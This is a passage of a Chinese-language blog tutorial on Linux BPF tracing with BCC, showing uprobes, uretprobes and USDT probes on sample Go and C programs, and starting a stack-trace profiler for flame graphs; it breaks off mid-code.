title="uprobes"></a>uprobes</h4><p>一般来说，<code>uprobes</code>是内核在执行特定指令之前插入到程序指令集中的钩子。将<code>uprobes</code>附加到同一程序的不同版本时需要小心，因为函数签名可能会在这些版本之间内部发生变化。保证BPF程序在两个不同版本中运行的唯一方法是确保签名没有更改。你可以在Linux中使用命令<code>nm</code>列出ELF目标文件中包含的所有符号，这是检查你正在跟踪的指令是否仍然存在程序中的好办法，例如：</p><p><code>main.go</code>程序如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">    fmt.Println(<span class="string">"Hello, BPF"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着使用<code>go build -o hello-bpf main.go</code>编译这个Go程序。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# go build -o hello-bpf main.go</span><br></pre></td></tr></table></figure><p>最后使用命令<code>nm</code>获取有关二进制文件包含的所有指令点的信息。<code>nm</code>是GNU开发工具中包含的一个程序，它列出了目标文件中的符号。 如果你过滤名称中带有<code>main</code>的符号，会得到一个类似如下的列表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# nm hello-bpf | grep main</span><br><span class="line">0000000000535ec0 D main..inittask</span><br><span class="line">0000000000497640 T main.main</span><br><span class="line">0000000000434d20 T runtime.main</span><br><span class="line">000000000045e440 T runtime.main.func1</span><br><span class="line">000000000045e4a0 T runtime.main.func2</span><br><span class="line">000000000054ab50 B runtime.main_init_done</span><br><span class="line">00000000004d8828 R runtime.mainPC</span><br><span class="line">0000000000578210 B runtime.mainStarted</span><br></pre></td></tr></table></figure><p>现在你有了一个符号列表，可以跟踪它们何时执行，甚至在执行相同二进制文件的不同进程之间。</p><p>为了跟踪我们之前的 Go 示例中的 main 函数何时执行，我们将编写一个 BPF 程序，并将其附加到一个 uprobe，该 uprobe 将在任何进程调用该指令之前中断：</p><p><code>uprobes.py</code>程序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">int trace_go_main(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  bpf_trace_printk("New hello-bpf process running with PID: %d\\n", pid);1</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text = bpf_source)</span><br><span class="line">bpf.attach_uprobe(name = <span class="string">"./hello-bpf"</span>, sym = <span class="string">"main.main"</span>, fn_name = <span class="string">"trace_go_main"</span>)<span class="number">2</span></span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>1：使用函数<code>bpf_get_current_pid_tgid</code>来获取运行我们的<code>hello-bpf</code>程序的进程的进程标识符 (PID)。</p><p>2：将此程序附着到<code>uprobe</code>。 这个调用需要知道我们要跟踪的对象<code>hello-bpf</code>是对象文件的绝对路径。它还需要我们在对象内部跟踪的符号，在本例中为<code>main.main</code>，以及我们要运行的BPF程序。 这样，每当有人在我们的系统中运行<code>hello-bpf</code>时，我们都会在跟踪管道中获得一个新日志。</p><p>首先执行<code>hello-bpf</code>程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br></pre></td></tr></table></figure><p>接着查看<code>uprobes.py</code>程序的输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# python3 uprobes.py </span><br><span class="line">b'       hello-bpf-1977813 [000] d..31 841378.451282: bpf_trace_printk: New hello-bpf process running with PID: 1977813'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1977821 [000] d..31 841383.099817: bpf_trace_printk: New hello-bpf process running with PID: 1977821'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1977829 [000] d..31 841384.195796: bpf_trace_printk: New hello-bpf process running with PID: 1977829'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1977833 [000] d..31 841384.907406: bpf_trace_printk: New hello-bpf process running with PID: 1977833'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1977836 [000] d..31 841385.280290: bpf_trace_printk: New hello-bpf process running with PID: 1977836'</span><br></pre></td></tr></table></figure><h4 id="Uretprobes"><a href="#Uretprobes" class="headerlink" title="Uretprobes"></a>Uretprobes</h4><p><code>Uretprobes</code>是<code>kretprobes</code>的并行探针，但用于用户空间程序。它们将BPF程序附着到返回值的指令上，并让你通过访问BPF代码中的寄存器来访问这些返回值。</p><p>结合<code>uprobes</code>和<code>uretprobes</code>可以让你编写更复杂的BPF程序。 它们可以让你更全面地了解系统中运行的应用程序。当你可以在函数运行之前和完成后立即注入跟踪代码时，可以开始收集更多数据并测量应用程序行为。一个常见的用例是测量一个函数执行需要多长时间，而无需更改应用程序中的一行代码。</p><p><code>uretprobes.py</code>程序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">BPF_HASH(cache, u64, u64);</span></span><br><span class="line"><span class="string">int trace_start_time(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  u64 start_time_ns = bpf_ktime_get_ns();</span></span><br><span class="line"><span class="string">  cache.update(&amp;pid, &amp;start_time_ns);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int print_duration(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  u64 *start_time_ns = cache.lookup(&amp;pid);</span></span><br><span class="line"><span class="string">  if (start_time_ns == 0) &#123;</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  u64 duration_ns = bpf_ktime_get_ns() - *start_time_ns;</span></span><br><span class="line"><span class="string">  bpf_trace_printk("Function call duration: %d\\n", duration_ns);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text = bpf_source)</span><br><span class="line">bpf.attach_uprobe(name = <span class="string">"./hello-bpf"</span>, sym = <span class="string">"main.main"</span>, fn_name = <span class="string">"trace_start_time"</span>)</span><br><span class="line">bpf.attach_uretprobe(name = <span class="string">"./hello-bpf"</span>, sym = <span class="string">"main.main"</span>, fn_name = <span class="string">"print_duration"</span>)</span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>首先执行<code>hello-bpf</code>程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br></pre></td></tr></table></figure><p>接着查看<code>uprobes.py</code>程序的输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# python3 uprobes.py </span><br><span class="line">b'       hello-bpf-1980788 [000] d..31 842673.650139: bpf_trace_printk: Function call duration: 73230'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1980801 [000] d..31 842677.296529: bpf_trace_printk: Function call duration: 307682'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1980810 [000] d..31 842678.797365: bpf_trace_printk: Function call duration: 85177'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1980814 [000] d..31 842680.214506: bpf_trace_printk: Function call duration: 330715'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1980818 [000] d..31 842681.247549: bpf_trace_printk: Function call duration: 70589'</span><br></pre></td></tr></table></figure><h4 id="User-Statically-Defined-Tracepoints"><a href="#User-Statically-Defined-Tracepoints" class="headerlink" title="User Statically Defined Tracepoints"></a>User Statically Defined Tracepoints</h4><p>用户静态定义的跟踪点(USDT)为用户空间中的应用程序提供静态跟踪点。这是一种检测应用程序的便捷方式，因为它们提供了BPF提供的跟踪功能的低开销入口点。你还可以将它们用作在生产中跟踪应用程序的约定，而不管这些应用程序是使用何种编程语言编写的。</p><p>USDT由DTrace推广，DTrace最初由Sun Microsystems开发，用于Unix系统的动态检测。 由于许可问题，DTrace直到最近才在Linux中可用；但是，Linux内核开发人员从DTrace的原始工作中获得了很多灵感来实现USDT。</p><p>就像之前看到的静态内核跟踪点一样，USDT要求开发人员使用指令来检测他们的代码，内核将使用这些指令作为陷阱来执行BPF程序。 USDT的<code>Hello World</code>版本只有几行代码：</p><p><code>hello_usdt.c</code>程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sdt.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">DTRACE_PROBE(<span class="string">"hello-usdt"</span>, <span class="string">"probe-main"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，我们使用Linux提供的宏来定义我们的第一个USDT。<code>DTRACE_PROBE</code>将注册内核将用于注入BPF函数回调的跟踪点。该宏中的第一个参数是报告跟踪的程序。第二个是我们报告跟踪的名称。</p><p>安装在系统中的许多应用程序都可能使用这种类型的探针，以便以一种可预测的方式访问运行时跟踪数据。例如，数据库MySQL使用静态定义的跟踪点公开各种信息。你可以从服务器中执行的查询以及许多其他用户操作中收集信息。<code>Node.js</code>是构建在<code>Chrome V8</code>引擎上的JavaScript运行时，同样提供了可用于提取运行时信息的跟踪点。</p><p>在展示如何将BPF程序附着到用户定义的跟踪点之前，我们需要先谈谈可发现性。因为这些跟踪点是在可执行文件中以二进制格式定义的，所以我们需要一种方法来列出程序定义的探针，而无需深入研究源代码。提取此信息的一种方法是直接读取ELF二进制文件。首先，我们将编译我们之前的Hello World USDT示例； 我们可以为此使用 GCC：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o hello_usdt hello_usdt.c</span><br></pre></td></tr></table></figure><p>编译报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hello_usdt.c:1:10: fatal error: sys/sdt.h: No such file or directory</span><br><span class="line"><span class="meta"> #</span><span class="bash">include &lt;sys/sdt.h&gt;</span></span><br><span class="line">          ^~~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br></pre></td></tr></table></figure><p>报错解决如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# yum install systemtap-sdt-devel</span><br></pre></td></tr></table></figure><p>上述<code>gcc</code>命令将生成一个名为<code>hello_usdt</code>的二进制文件，我们可以使用该文件开始使用多个工具来发现它定义的跟踪点。 Linux提供了一个名为<code>readelf</code>的实用程序来显示有关ELF文件的信息。 你可以将它与我们编译的示例一起使用，<code>readelf</code>可以提供有关二进制文件的大量信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# readelf -n ./hello_usdt</span><br><span class="line">Displaying notes found in: .note.stapsdt</span><br><span class="line">  Owner                 Data sizeDescription</span><br><span class="line">  stapsdt              0x00000033NT_STAPSDT (SystemTap probe descriptors)</span><br><span class="line">    Provider: "hello-usdt"</span><br><span class="line">    Name: "probe-main"</span><br></pre></td></tr></table></figure><p>发现二进制文件中定义的跟踪点的更好选择是使用BCC的<code>tplist</code>工具，该工具可以显示内核跟踪点和USDT。这个工具的优点是它的输出简单；仅显示跟踪点定义，而没有关于可执行文件的任何其他信息。用法类似于<code>readelf</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# /usr/share/bcc/tools/tplist -l ./hello_usdt</span><br><span class="line">b'./hello_usdt' b'"hello-usdt"':b'"probe-main"'</span><br></pre></td></tr></table></figure><p>它列出了你在单独的行中定义的每个跟踪点。在我们的示例中，它仅显示一行带有我们的<code>probe-main</code>定义：</p><p>在你知道二进制文件中支持的跟踪点之后，你可以将BPF程序附着到它们上，就像你在前面的例子中看到的那样：</p><p><code>usdt.py</code>程序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF, USDT</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">int trace_binary_exec(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  bpf_trace_printk("New hello_usdt process running with PID: %d\\n", pid);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">usdt = USDT(path = <span class="string">"./hello_usdt"</span>)<span class="number">1</span></span><br><span class="line">usdt.enable_probe(probe = <span class="string">"probe-main"</span>, fn_name = <span class="string">"trace_binary_exec"</span>)<span class="number">2</span></span><br><span class="line">bpf = BPF(text = bpf_source, usdt_contexts = [usdt])<span class="number">3</span></span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>1：创建一个USDT对象； USDT不是BPF的一部分，因为你可以在无需与BPF虚拟机交互的情况下使用它们。因为它们彼此独立，所以它们的使用独立于BPF代码。</p><p>2：附着BPF函数以跟踪程序执行到我们应用程序中的探针</p><p>3：使用刚刚创建的跟踪点定义初始化BPF环境。 这将通知BCC需要生成代码来连接我们的BPF程序和二进制文件中的探针定义。当它们都连接时，我们可以打印BPF程序生成的跟踪，以发现二进制示例中最新的执行。</p><h3 id="可视化跟踪数据"><a href="#可视化跟踪数据" class="headerlink" title="可视化跟踪数据"></a>可视化跟踪数据</h3><p>到目前为止，我们已经展示了在调试输出中打印数据的示例。这在生产环境中不是很有用。 没有人喜欢理解冗长而复杂的日志。如果我们想监控延迟和CPU利用率的变化，通过查看一段时间内的图表比汇总文件流中的数字更容易。</p><p>本节探讨呈现BPF跟踪数据的不同方式。一方面，我们将展示BPF程序如何构建聚合信息。另一方面，你将学习如何以便携式表示形式导出该信息，并使用现成的工具访问更丰富的表示形式并与其他人分享。</p><h4 id="火焰图"><a href="#火焰图" class="headerlink" title="火焰图"></a>火焰图</h4><p>火焰图是帮助你可视化系统花费时间的图表。它们可以让你清楚地表示应用程序中的哪些代码执行得更频繁。火焰图的创建者<code>Brendan Gregg</code>维护了一组脚本，可以在GitHub上轻松生成这些可视化格式。我们使用这些脚本从本节后面使用BPF收集的数据生成火焰图。 </p><p>关于火焰图显示的内容，需要记住两件重要的事情：</p><ul><li>x轴按字母顺序排列。每个堆栈的宽度表示它在收集数据中出现的频率，这可以与启用探查器时访问该代码路径的频率相关。</li><li>y 轴显示在分析器读取堆栈跟踪时排序，保留跟踪层次结构。</li></ul><p>最著名的火焰图代表了系统中最频繁消耗CPU的代码；这些被称为CPU图。另一个有趣的火焰图可视化是CPU外图；它们代表CPU在与应用程序无关的其他任务上花费的时间。通过组合<code>on-CPU</code>和<code>off-CPU</code>图表，可以全面了解系统花费CPU周期的内容。</p><p>CPU内和CPU外图都使用堆栈跟踪来指示系统花费时间的位置。 一些编程语言，如Go，总是在其二进制文件中包含跟踪信息，但其他编程语言，如 C++ 和Java，需要一些额外的工作才能使堆栈跟踪可读。在你的应用程序包含堆栈跟踪信息后，BPF程序可以使用它来聚合内核看到的最常见的代码路径。</p><p>内核中的堆栈跟踪聚合有优点也有缺点。一方面，这是一种计算堆栈跟踪频率的有效方法，因为它发生在内核中，避免将每个堆栈信息发送到用户空间并减少内核和用户空间之间的数据交换。另一方面，非CPU图表要处理的事件数量可能会非常高，因为你正在跟踪应用程序上下文切换期间发生的每个事件。如果尝试对其进行分析太长时间，这可能会在系统中产生大量开销。 使用火焰图时请记住这一点。</p><p>BCC提供了几个实用程序来帮助聚合和可视化堆栈跟踪，主要的是宏<code>BPF_STACK_TRACE</code>。 这个宏生成一个<code>BPF_MAP_TYPE_STACK_TRACE</code>类型的BPF映射来存储BPF程序累积的堆栈。最重要的是，这个BPF映射得到了增强，增加了从程序上下文中提取堆栈信息的方法，并在聚合它们后在你想使用它们时遍历累积的堆栈跟踪。</p><p>在下一个示例中，我们构建了一个简单的BPF分析器，它打印从用户空间应用程序收集的堆栈跟踪。我们使用分析器收集的轨迹生成CPU上的火焰图。为了测试这个分析器，我们将编写一个生成CPU负载的最小Go程序。<code>main.go</code>程序代码如下所示</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">"time"</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; </span><br><span class="line">  j:=<span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> time.Since(time.Now()) &lt; time.Second &#123; </span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">1</span>;i&lt;<span class="number">1000000</span>;i++&#123;</span><br><span class="line">j*=i </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果将此代码保存在名为<code>main.go</code>的文件中并使用<code>go run main.go</code>运行它您会看到系统的CPU利用率显着增加。 你可以通过按键盘上的<code>Ctrl-C</code>来停止执行，CPU利用率将恢复正常。</p><p>我们BPF程序的第一部分将初始化分析器结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/bpf_perf_event.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"><span class="string">struct trace_t &#123;1</span></span><br><span class="line"><span class="string">  int stack_id;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">BPF_HASH(cache, struct trace_t);2</span></span><br><span class="line"><span class="string">BPF_STACK_TRACE(traces, 10000);3</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>1：初始化一个结构，该结构将存储我们的分析器接收到的每个堆栈帧的引用标识符。 稍后我们使用这些标识符来找出当时正在执行的代码路径。</p><p>2：初始化一个BPF哈希映射，我们用它来聚合我们看到相同strack帧的频率。 火焰图脚本使用此聚合值来确定执行相同代码的频率。</p><p>3：初始化我们的BPF堆栈跟踪映射。 我们为此地图设置了最大尺寸，但它可能会根据要处理的数据量而有所不同。将这个值作为变量会更好，但我们知道写的Go应用程序不是很大，所以10000个元素就足够了。</p><p>接下来，我们在分析器中实现聚合堆栈跟踪的函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int collect_stack_traces(struct bpf_perf_event_data *ctx) &#123;</span></span><br><span class="line"><span class="string">  u32 pid = bpf_get_current_pid_tgid() &gt;&gt; 32;1</span></span><br><span class="line"><span class="string">  if (pid != PROGRAM_PID)</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  struct trace_t trace = &#123;2</span></span><br><span class="line"><span class="string">    .stack_id = traces.get_stackid(&amp;ctx-&gt;regs, BPF_F_USER_STACK)</span></span><br><span class="line"><span class="string">  &#125;;</span></span><br><span class="line"><span class="string">  cache.increment(trace);3</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>1：验证当前BPF上下文中程序的进程ID是不是我们的Go应用程序的进程ID；否则，我们将忽略该事件。我们目前还没有定义<code>PROGRAM_PID</code>的值。在初始化BPF程序之前，让我们在分析器的Python部分替换这个字符串。这是BCC初始化BPF程序方式的当前限制；我们不能从用户空间传递任何变量，并且作为一种常见的做法，这些字符串在初始化之前在代码中被替换。</p><p>2：创建跟踪以汇总其使用情况。我们使用内置函数<code>get_stackid</code>从程序上下文中获取堆栈ID。 这是BCC添加到我们的堆栈跟踪映射的辅助函数之一。我们使用标志<code>BPF_F_USER_STACK</code>来表示我们想要获取用户空间应用程序的堆栈ID，我们并不关心内核内部发生了什么。</p><p>3：增加跟踪的计数器以跟踪相同代码的执行频率。</p><p>接下来，我们要将堆栈跟踪收集器附加到内核中的所有<code>Perf</code>事件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">program_pid = int(sys.argv[<span class="number">1</span>])<span class="number">1</span></span><br><span class="line">bpf_source = bpf_source.replace(<span class="string">'PROGRAM_PID'</span>, str(program_pid))<span class="number">2</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)</span><br><span class="line">bpf.attach_perf_event(ev_type=PerfType.SOFTWARE,<span class="number">3</span></span><br><span class="line">                      ev_config=PerfSWConfig.CPU_CLOCK,</span><br><span class="line">                      fn_name=<span class="string">'collect_stack_traces'</span>,</span><br><span class="line">                      sample_period=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">exiting = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>1：Python程序的第一个参数是我们正在分析的Go应用程序的进程标识符。</p><p>2：使用Python的内置替换函数将BPF源中的字符串<code>PROGRAM_ID</code>与提供给分析器的参数交换。</p><p>3：将BPF程序附加到所有软件<code>Perf</code>事件，这将忽略任何其他事件，如硬件事件。我们还将BPF程序配置为使用CPU时钟作为时间源，这样我们就可以测量执行时间。</p><p>最后，我们需要实现在分析器中断时将堆栈跟踪转储到标准输出中的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sleep(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    exiting = <span class="number">1</span></span><br><span class="line">    signal.signal(signal.SIGINT, signal_ignore)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"dumping the results"</span>)</span><br><span class="line"><span class="keyword">for</span> trace, acc <span class="keyword">in</span> sorted(bpf[<span class="string">'cache'</span>].items(), key=<span class="keyword">lambda</span> cache: cache[<span class="number">1</span>].value):<span class="number">1</span></span><br><span class="line">    line = []</span><br><span class="line">    <span class="keyword">if</span> trace.stack_id &lt; <span class="number">0</span> <span class="keyword">and</span> trace.stack_id == -errno.EFAULT:<span class="number">2</span></span><br><span class="line">        line = [<span class="string">'Unknown stack'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        stack_trace = list(bpf[<span class="string">'traces'</span>].walk(trace.stack_id))</span><br><span class="line">        <span class="keyword">for</span> stack_address <span class="keyword">in</span> reversed(stack_trace):<span class="number">3</span></span><br><span class="line">            function_name = bpf.sym(stack_address, program_pid).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="keyword">if</span> function_name == <span class="string">'[unknown]'</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            line.extend([function_name])<span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(line) &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    frame = <span class="string">";"</span>.join(line)<span class="number">5</span></span><br><span class="line">    sys.stdout.write(<span 